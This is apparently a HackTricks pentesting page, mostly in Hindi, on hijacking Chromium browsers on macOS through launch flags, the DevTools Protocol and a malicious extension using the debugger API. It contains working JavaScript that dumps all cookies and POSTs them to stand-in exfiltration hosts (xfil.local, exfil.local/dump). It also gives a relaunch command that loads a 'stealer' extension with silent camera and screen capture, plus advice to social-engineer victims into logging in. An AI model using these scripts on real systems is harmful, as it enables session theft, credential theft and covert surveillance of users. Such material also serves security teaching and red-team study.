# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

Chromium-based ब्राउज़र्स जैसे Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, और Opera सभी एक ही command-line switches, preference files, और DevTools automation interfaces का उपयोग करते हैं। macOS पर, किसी भी GUI एक्सेस वाला उपयोगकर्ता मौजूदा ब्राउज़र सत्र को समाप्त कर सकता है और इसे arbitrary flags, extensions, या DevTools endpoints के साथ पुनः खोल सकता है जो लक्ष्य के entitlements के साथ चलते हैं।

#### macOS पर custom flags के साथ Chromium लॉन्च करना

macOS हर Chromium profile के लिए एक single UI instance रखता है, इसलिए instrumentation सामान्यतः browser को force-close करने की मांग करता है (उदाहरण के लिए `osascript -e 'tell application "Google Chrome" to quit'`)। Attackers आमतौर पर `open -na "Google Chrome" --args <flags>` के जरिए पुनः लॉन्च करते हैं ताकि वे app bundle को बदले बिना arguments inject कर सकें। उस कमांड को एक user LaunchAgent (`~/Library/LaunchAgents/*.plist`) या login hook में रैप करने से यह सुनिश्चित होता है कि tampered browser reboot/logoff के बाद पुनः respawn हो जाए।

#### `--load-extension` Flag

`--load-extension` flag unpacked extensions (comma-separated paths) को auto-load करता है। इसे `--disable-extensions-except` के साथ जोड़कर आप वैध extensions को ब्लॉक कर सकते हैं जबकि केवल आपका payload चले। Malicious extensions उच्च प्रभाव वाले permissions जैसे `debugger`, `webRequest`, और `cookies` का request कर सकते हैं ताकि वे DevTools protocols में pivot कर सकें, CSP headers patch करें, HTTPS downgrade करें, या browser शुरू होते ही session सामग्री exfiltrate कर लें।

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

ये switches Chrome DevTools Protocol (CDP) को TCP या pipe के माध्यम से expose करते हैं ताकि external tooling browser को drive कर सके। Google ने इस interface के व्यापक infostealer दुरुपयोग को देखा और, Chrome 136 (March 2025) से शुरू होकर, ये switches default profile के लिए ignore किए जाते हैं जब तक browser non-standard `--user-data-dir` के साथ लॉन्च न हो। इससे real profiles पर App-Bound Encryption लागू होता है, लेकिन attackers अभी भी एक fresh profile बना सकते हैं, victim को उसमें authenticate करने के लिए मजबूर कर सकते हैं (phishing/triage assistance), और CDP के माध्यम से cookies, tokens, device trust states, या WebAuthn registrations harvest कर सकते हैं।

#### `--user-data-dir` Flag

यह flag पूरे browser profile (History, Cookies, Login Data, Preference files, आदि) को attacker-controlled path पर redirect करता है। आधुनिक Chrome builds को `--remote-debugging-port` के साथ मिलाते समय यह आवश्यक है, और यह tampered profile को isolated रखता है ताकि आप pre-populated `Preferences` या `Secure Preferences` फाइलें डाल सकें जो security prompts को disable कर दें, extensions auto-install कर दें, और default schemes बदल दें।

#### `--use-fake-ui-for-media-stream` Flag

यह switch camera/mic permission prompt को bypass कर देता है ताकि कोई भी पेज जो `getUserMedia` कॉल करता है, तुरंत access प्राप्त कर ले। इसे `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, या CDP `Browser.grantPermissions` commands के साथ जोड़कर आप बिना user interaction के चुपचाप audio/video capture, desk-share, या WebRTC permission checks पूरा कर सकते हैं।

## Remote Debugging & DevTools Protocol का दुरुपयोग

एक बार जब Chrome को dedicated `--user-data-dir` और `--remote-debugging-port` के साथ पुनः लॉन्च किया जाता है, आप CDP के माध्यम से attach कर सकते हैं (उदा., `chrome-remote-interface`, `puppeteer`, या `playwright` से) और high-privilege workflows को script कर सकते हैं:

- **Cookie/session theft:** `Network.getAllCookies` और `Storage.getCookies` HttpOnly मान लौटाते हैं, यहां तक कि जब App-Bound encryption सामान्यतः filesystem access को रोकता है, क्योंकि CDP चल रहे browser से उन्हें decrypt करने के लिए कहता है।
- **Permission tampering:** `Browser.grantPermissions` और `Emulation.setGeolocationOverride` आपको camera/mic prompts को bypass करने देते हैं (खासतौर पर जब `--use-fake-ui-for-media-stream` के साथ) या location-based security checks को फाल्सिफाई करने देते हैं।
- **Keystroke/script injection:** `Runtime.evaluate` active tab के अंदर arbitrary JavaScript execute करता है, जिससे credential lifting, DOM patching, या navigation के बाद भी टिके रहने वाले persistence beacons inject करना संभव होता है।
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` और `Fetch.enable` authenticated requests/responses को real time में intercept करते हैं बिना disk artifacts को छुए।
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

2023 की "Chrowned by an Extension" रिसर्च ने दिखाया कि एक malicious extension जो `chrome.debugger` API का उपयोग करता है, किसी भी tab से attach कर सकता है और `--remote-debugging-port` जितनी ही DevTools powers प्राप्त कर सकता है। इससे मूल isolation assumptions टूट जाती हैं (extensions stay in their context) और यह सक्षम बनाता है:

- मौन cookie और credential चोरी `Network.getAllCookies`/`Fetch.getResponseBody` के जरिए।
- site permissions (camera, microphone, geolocation) का परिवर्तन और security interstitial bypass, जिससे phishing pages Chrome dialogs का impersonate कर सकती हैं।
- TLS warnings, downloads, या WebAuthn prompts की on-path छेड़छाड़, programmatically `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, या `Security.handleCertificateError` चलाकर।

Extension को `--load-extension`/`--disable-extensions-except` के साथ लोड करें ताकि किसी user interaction की आवश्यकता न पड़े। API को weaponize करने वाला एक न्यूनतम background script इस तरह दिखता है:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
एक extension `Debugger.paused` इवेंट्स को सब्सक्राइब भी कर सकता है ताकि JavaScript वेरिएबल पढ़े जा सकें, inline scripts को patch किया जा सके, या ऐसे custom breakpoints डाले जा सकें जो navigation के बाद भी बने रहें। चूँकि सब कुछ उपयोगकर्ता के GUI session के अंदर चलता है, Gatekeeper और TCC ट्रिगर नहीं होते, इसलिए यह तकनीक उन malware के लिए आदर्श है जो पहले ही user context में execution हासिल कर चुके हैं।

### उपकरण

- https://github.com/breakpointHQ/snoop - Chromium लॉन्च्स को payload extensions के साथ ऑटोमेट करता है और interactive CDP hooks एक्सपोज़ करता है।
- https://github.com/breakpointHQ/VOODOO - यह समान tooling है जो traffic interception और browser instrumentation पर केंद्रित है, macOS operators के लिए।
- https://github.com/cyrus-and/chrome-remote-interface - Node.js लाइब्रेरी जो Chrome DevTools Protocol के dumps (cookies, DOM, permissions) को स्क्रिप्ट करने के लिए है जब `--remote-debugging-port` instance live हो।

### उदाहरण
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
उपकरणों के लिंक में और उदाहरण देखें।

## संदर्भ

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
